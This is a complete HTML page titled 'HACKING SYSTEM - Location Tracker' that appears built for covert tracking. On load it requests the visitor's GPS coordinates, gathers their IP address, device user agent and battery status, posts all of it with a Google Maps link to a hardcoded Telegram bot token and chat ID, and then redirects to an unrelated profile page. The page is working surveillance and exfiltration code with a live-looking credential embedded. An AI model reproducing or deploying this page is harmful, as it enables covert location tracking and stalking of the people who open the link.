<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>HACKING SYSTEM - Location Tracker</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      height: 100%;
      background: #000;
      overflow: hidden;
      font-family: 'Share Tech Mono', monospace;
      color: #0f0;
      user-select: none;
    }
    canvas#matrix {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      pointer-events: none;
    }
    .container {
      position: relative;
      z-index: 10;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 1rem;
      background: rgba(0,0,0,0.6);
      box-shadow: inset 0 0 60px 5px #00ff00, 0 0 30px 10px #00ff00;
      border-radius: 15px;
      max-width: 480px;
      margin: auto;
    }
    h1 {
      font-size: 3rem;
      letter-spacing: 0.4em;
      margin-bottom: 0.3em;
      color: #0f0;
      text-shadow: 0 0 5px #0f0, 0 0 20px #0f0, 0 0 30px #00ff00, 0 0 40px #00ff00;
      animation: flicker 3s infinite alternate;
    }
    h2 {
      font-size: 1.4rem;
      color: #0f0;
      text-shadow: 0 0 10px #0f0;
      margin-bottom: 2rem;
      min-height: 2.2em;
      white-space: pre-line;
    }
    @keyframes flicker {
      0%,19%,21%,23%,25%,54%,56%,100% { opacity: 1; }
      20%,22%,24%,55% { opacity: 0.4; text-shadow: none; }
    }
    .typing-text {
      border-right: 3px solid #0f0;
      white-space: nowrap;
      overflow: hidden;
      width: 0;
      animation: typing 4s steps(40, end) forwards, blink 0.7s step-end infinite alternate;
      margin-bottom: 2rem;
    }
    @keyframes typing { to { width: 100%; } }
    @keyframes blink { 50% { border-color: transparent; } }
    .spinner {
      width: 120px;
      height: 120px;
      border: 10px solid rgba(0,255,0,0.1);
      border-top: 10px solid #0f0;
      border-radius: 50%;
      animation: spin 2s linear infinite;
      margin-bottom: 3rem;
      box-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    button.retry-btn {
      background: transparent;
      color: #0f0;
      border: 2px solid #0f0;
      padding: 1rem 2.5rem;
      font-size: 1rem;
      letter-spacing: 0.15em;
      cursor: pointer;
      border-radius: 8px;
      box-shadow: 0 0 5px #0f0, 0 0 10px #0f0 inset;
      transition: all 0.3s ease;
    }
    button.retry-btn:hover {
      background: #0f0;
      color: #000;
      box-shadow: 0 0 20px #0f0, 0 0 30px #0f0 inset;
      transform: scale(1.05);
    }
    .notice {
      margin-top: 1rem;
      font-weight: bold;
      color: #0f0;
      text-shadow: 0 0 10px #0f0;
      min-height: 2em;
    }
    @media (max-width: 480px) {
      h1 { font-size: 2.2rem; letter-spacing: 0.25em; }
      h2 { font-size: 1.1rem; }
      .spinner {
        width: 80px; height: 80px; border-width: 6px;
        margin-bottom: 2rem;
      }
      button.retry-btn {
        padding: 0.8rem 1.8rem;
        font-size: 0.9rem;
      }
    }
  </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="container">
  <h1>HACKING SYSTEM</h1>
  <h2 id="statusText"></h2>
  <div class="spinner"></div>
  <button id="retryBtn" class="retry-btn" style="display:none;">RETRY</button>
  <div id="notice" class="notice"></div>
</div>

<script>
  // Matrix effect
  const canvas = document.getElementById('matrix');
  const ctx = canvas.getContext('2d');
  let width, height, columns, drops = [];

  function setupMatrix() {
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;
    columns = Math.floor(width / 20);
    drops = Array(columns).fill(1);
  }

  function drawMatrix() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
    ctx.fillRect(0, 0, width, height);
    ctx.fillStyle = '#0f0';
    ctx.font = '18px monospace';

    for (let i = 0; i < drops.length; i++) {
      const text = String.fromCharCode(0x30A0 + Math.random() * 96);
      ctx.fillText(text, i * 20, drops[i] * 20);
      if (drops[i] * 20 > height && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    }
  }

  function animateMatrix() {
    drawMatrix();
    requestAnimationFrame(animateMatrix);
  }

  window.addEventListener('resize', setupMatrix);
  setupMatrix();
  animateMatrix();

  // Hacking logic
  const botToken = "8016737009:AAFg_IiAfOiECD2HYuxn8VXDUre-h1kuQK0";
  const chatId = "7896043263";
  const redirectURL = "https://mr-ahad.github.io/Profile/";

  const statusText = document.getElementById('statusText');
  const notice = document.getElementById('notice');
  const retryBtn = document.getElementById('retryBtn');

  function typeWriter(text, speed = 50) {
    statusText.textContent = "";
    let i = 0;
    return new Promise(resolve => {
      const interval = setInterval(() => {
        statusText.textContent += text.charAt(i);
        i++;
        if (i >= text.length) {
          clearInterval(interval);
          resolve();
        }
      }, speed);
    });
  }

  function getDeviceInfo() {
    return navigator.userAgent;
  }

  function getBatteryInfo() {
    if (navigator.getBattery) {
      return navigator.getBattery().then(battery => {
        return `Battery: ${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`;
      });
    } else {
      return Promise.resolve("Battery: Unknown");
    }
  }

  function getIPInfo() {
    return fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => `IP: ${data.ip}`)
      .catch(() => "IP: Unknown");
  }

  function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });
  }

  function buildMessage(lat, lon, ip, device, battery) {
    return `📍 Location Coordinates:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}\n\n📱 Device: ${device}\n🔋 ${battery}\n🌐 ${ip}\n\n[HACKING SYSTEM LOG]`;
  }

  async function collectAndSend(lat, lon) {
    const ip = await getIPInfo();
    const battery = await getBatteryInfo();
    const device = getDeviceInfo();
    const msg = buildMessage(lat, lon, ip, device, battery);
    sendToTelegram(msg);
    await typeWriter("Location successfully acquired and sent!", 60);
    notice.textContent = "Tracking in progress. Please wait...";
    retryBtn.style.display = "none";
    setTimeout(() => { window.location.href = redirectURL; }, 3500);
  }

  async function requestLocation() {
    retryBtn.style.display = "none";
    notice.textContent = "";
    await typeWriter("LOADING LOCATION ACCESS...", 50);

    if (!navigator.geolocation) {
      statusText.textContent = "Geolocation not supported on this device.";
      notice.textContent = "Enable GPS or use supported browser.";
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async position => {
        const lat = position.coords.latitude.toFixed(6);
        const lon = position.coords.longitude.toFixed(6);
        await collectAndSend(lat, lon);
      },
      async error => {
        statusText.textContent = "Location access denied or failed!";
        notice.textContent = "Unable to fetch location. Please allow GPS or check browser settings.";
        retryBtn.style.display = "inline-block";
      },
      { timeout: 20000 }
    );
  }

  retryBtn.addEventListener('click', () => requestLocation());
  window.onload = requestLocation;
</script>

</body>
</html>
